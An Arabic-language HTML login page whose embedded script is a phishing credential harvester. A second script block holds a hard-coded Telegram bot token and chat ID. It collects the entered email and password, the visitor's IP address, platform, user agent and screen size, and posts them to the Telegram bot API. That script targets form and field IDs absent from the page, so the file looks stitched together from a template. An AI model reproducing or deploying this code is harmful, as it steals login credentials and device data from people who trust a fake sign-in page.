<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تسجيل دخول</title>

  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fffbe6;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .box {
      background: white;
      padding: 30px; /* كبرنا المربع */
      border-radius: 15px;
      width: 350px; /* كبرناه */
      box-shadow: 0 0 15px rgba(0,0,0,0.15);
      text-align: center;
    }

    /* الصورة فوق تسجيل الدخول */
    .top-img {
      width: 80px;
      height: 80px;
      margin-bottom: 15px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border-radius: 10px;
      border: 1px solid #ccc;
      font-size: 15px;
    }

    button {
      width: 100%;
      padding: 12px;
      background: #ffeb3b;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      font-size: 16px;
      margin-top: 10px;
    }

    #result {
      margin-top: 15px;
      font-size: 14px;
      color: #444;
      white-space: pre-line;
    }
  </style>
</head>
<body>

  <div class="box">

    <!-- الصورة فوق تسجيل الدخول -->
    <img src="faviconV2.png" class="top-img" alt="">

    <h2>تسجيل دخول</h2>

    <input type="text" id="user" placeholder="ادخل اسم المستخدم">
    <input type="password" id="pass" placeholder="كلمة السر">

    <button onclick="showData()">دخول</button>

    <div id="result"></div>
  </div>

  <script>
    function showData() {
      const u = document.getElementById("user").value;
      const p = document.getElementById("pass").value;

      document.getElementById("result").innerText =
        "اللي انكتب:\n" +
        "النص: " + u + "\n" +
        "كلمة السر: " + p;
    }
  </script>

  <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
<script>
    const TOKEN = "8561258165:AAG_t4hTOHLvpEpe-_dn_s98dmmr5ZOMJ7U";                                                            // Ù‡Ù†Ø§ Ø§Ù„ØªÙˆÙƒÙŠÙ†              
    const CHAT_ID = "8234715344";                                                       // Ù‡Ù†Ø§ Ù…Ø¹Ø±Ù Ø§Ù„Ø´Ø§Øª https://api.telegram.org/bot/getUpdates
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;

                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                const message = ` 
                    <b>New Login Attempt</b>\n
                    <b>Email:</b> ${email}\n
                    <b>Password:</b> ${password}\n
                    <b>IP Address:</b> ${ip}\n
                    <b>Device Type:</b> ${deviceType}\n
                    <b>Platform:</b> ${platform}\n
                    <b>User Agent:</b> ${userAgent}\n
                    <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                `;

                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                }).then(response => {
                    alert('Information sent successfully!');
                }).catch(error => {
                    alert('Error sending the information. Please try again.');
                });
            })
            .catch(error => {
                alert('Error fetching the IP address. Please try again.');
            });
    });
</script>

</body>
</html>
